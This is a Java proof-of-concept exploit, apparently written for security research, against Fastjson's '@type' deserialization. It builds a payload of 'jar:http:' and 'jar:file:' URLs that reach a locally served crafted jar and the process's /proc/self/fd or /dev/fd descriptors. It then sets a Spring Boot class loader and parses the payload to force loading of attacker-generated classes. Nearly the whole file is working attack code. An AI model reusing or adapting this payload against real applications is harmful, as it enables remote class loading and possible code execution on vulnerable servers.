import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.ByteArrayOutputStream;
import java.net.URL;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class fd {
    private static final int PORT = 18081;
    private static final int MIN = 3;
    private static final int MAX = 128;
    private static final String ROOT = System.getProperty("os.name").toLowerCase().contains("mac")
            ? "/dev/fd"
            : "/proc/self/fd";
    private static final String STAGE = "jar:http:..2130706433:" + PORT + ".x!.foo.Exception";
    private static String poc = poc();

    private static String poc() {
        StringBuilder json = new StringBuilder();
        json.append("[\n");
        json.append(item(STAGE));
        for (int i = MIN; i <= MAX; i++) {
            json.append(",\n");
            json.append(item(type(i)));
        }
        json.append("\n]");
        return json.toString();
    }

    private static String item(String type) {
        return "  {\n" +
                "    \"@type\":\"" + type + "\"\n" +
                "  }";
    }

    private static String type(int fd) {
        StringBuilder type = new StringBuilder("jar:file:");
        String[] parts = ROOT.split("/");
        for (String part : parts) {
            if (part.length() == 0) {
                continue;
            }
            type.append('.').append(part);
        }
        type.append('.').append(fd).append("!.fd").append(fd).append(".Exception");
        return type.toString();
    }

    private static byte[] makejar() throws Exception {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        JarOutputStream jar = new JarOutputStream(bytes);

        put(jar, "foo/Exception.class", STAGE);
        for (int i = MIN; i <= MAX; i++) {
            put(jar, "fd" + i + "/Exception.class", type(i));
        }

        jar.close();
        return bytes.toByteArray();
    }

    private static void put(JarOutputStream jar, String entry, String type) throws Exception {
        jar.putNextEntry(new JarEntry(entry));
        jar.write(common.makeclass(type.replace('.', '/')));
        jar.closeEntry();
    }

    public static void main(String[] args) throws Exception {
        common.start(PORT, makejar(), 30000);

        org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();
        URL fastjson = common.codeSource(JSON.class);
        ClassLoader loader = new org.springframework.boot.loader.LaunchedURLClassLoader(
                new URL[] {new URL("jar:" + fastjson + "!/")},
                ClassLoader.getSystemClassLoader().getParent()
        );
        ParserConfig.getGlobalInstance().setDefaultClassLoader(loader);

        Thread.sleep(300L);
        System.out.println(poc);

        try {
            JSON.parse(poc);
        } catch (Throwable e) {
            System.out.println(e);
        }

        Thread.sleep(1000L);
    }
}
